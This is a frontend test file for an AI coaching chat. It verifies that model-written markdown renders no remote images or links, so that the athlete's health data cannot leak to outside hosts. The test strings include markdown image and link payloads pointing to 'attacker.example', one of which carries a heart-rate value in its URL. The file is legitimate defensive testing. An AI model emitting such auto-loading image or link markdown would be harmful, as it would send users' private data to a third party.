/**
 * The coach's reply must not be able to reach a third-party host (#677).
 *
 * The message body is model-authored text rendered as markdown. react-markdown
 * renders no raw HTML without `rehype-raw`, so this was never an XSS question —
 * it is an egress one: a rendered remote `img` fetches its URL the moment the
 * message paints, with no click, and the coach prompt carries the athlete's
 * health data by construction (#499).
 *
 * These assert the render-level half. The CSP in `frontend/nginx.conf` is the
 * second, independent layer and cannot be exercised from jsdom.
 */

import { describe, expect, it } from 'vitest'
import { render } from '@testing-library/react'
import ReactMarkdown from 'react-markdown'

import { MARKDOWN_COMPONENTS } from './AIChat'

function renderCoachMarkdown(markdown: string) {
  return render(
    <ReactMarkdown components={MARKDOWN_COMPONENTS}>{markdown}</ReactMarkdown>,
  )
}

describe('coach markdown cannot reference a remote host', () => {
  it('renders no img element for a remote image', () => {
    const { container } = renderCoachMarkdown(
      '![](https://attacker.example/?d=restingHR58)',
    )
    expect(container.querySelector('img')).toBeNull()
  })

  it('renders no img element for a data: image either', () => {
    const { container } = renderCoachMarkdown('![x](data:image/png;base64,AAAA)')
    expect(container.querySelector('img')).toBeNull()
  })

  it('renders no anchor with an href', () => {
    const { container } = renderCoachMarkdown(
      '[click me](https://attacker.example/steal)',
    )
    expect(container.querySelector('a')).toBeNull()
    expect(container.querySelector('[href]')).toBeNull()
  })

  it('leaves no element carrying a remote src or href anywhere', () => {
    const { container } = renderCoachMarkdown(
      [
        'Your recovery looks fine.',
        '',
        '![](https://attacker.example/a.png)',
        '',
        'See [this](https://attacker.example/b) and ![alt](http://attacker.example/c.gif)',
      ].join('\n'),
    )

    const remote = Array.from(container.querySelectorAll('*')).filter((el) => {
      const src = el.getAttribute('src') ?? ''
      const href = el.getAttribute('href') ?? ''
      return /^https?:/i.test(src) || /^https?:/i.test(href)
    })
    expect(remote).toEqual([])
  })
})

describe('nothing disappears silently', () => {
  it('keeps the alt text of a dropped image', () => {
    const { getByText } = renderCoachMarkdown('![power curve](https://x.example/p.png)')
    expect(getByText('[image: power curve]')).toBeInTheDocument()
  })

  it('keeps both the label and the target of a dropped link', () => {
    const { container } = renderCoachMarkdown('[the study](https://example.com/paper)')
    expect(container.textContent).toContain('the study')
    expect(container.textContent).toContain('https://example.com/paper')
  })

  it('still renders ordinary coach prose and formatting', () => {
    const { container } = renderCoachMarkdown(
      '**Tuesday** is your threshold day.\n\n- 3×10 min\n- 5 min recovery',
    )
    expect(container.querySelector('strong')?.textContent).toBe('Tuesday')
    expect(container.querySelectorAll('li')).toHaveLength(2)
  })

  it('renders headings as paragraphs, as it always has', () => {
    const { container } = renderCoachMarkdown('# Week overview')
    expect(container.querySelector('h1')).toBeNull()
    expect(container.querySelector('p')?.textContent).toBe('Week overview')
  })
})
